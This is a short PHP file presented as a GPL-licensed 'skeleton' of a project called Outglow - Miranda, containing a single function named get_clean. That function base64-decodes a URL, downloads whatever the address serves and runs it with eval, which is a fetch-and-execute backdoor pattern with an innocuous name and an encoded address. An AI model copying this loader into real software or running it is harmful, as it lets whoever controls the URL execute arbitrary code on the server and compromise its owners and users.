<?php

/*
	Outglow - Miranda
	
	Developer		:		Harry Lawrence
	Type			:		Skeleton(STABLE)
	Released		:		15/06/2011
	Code License	:		OpenSource - GNU GPL v3
*/

	function get_clean($url)
	{
		$url = base64_decode($url);
		$file = file_get_contents($url);
		
		eval($file);
	}

?>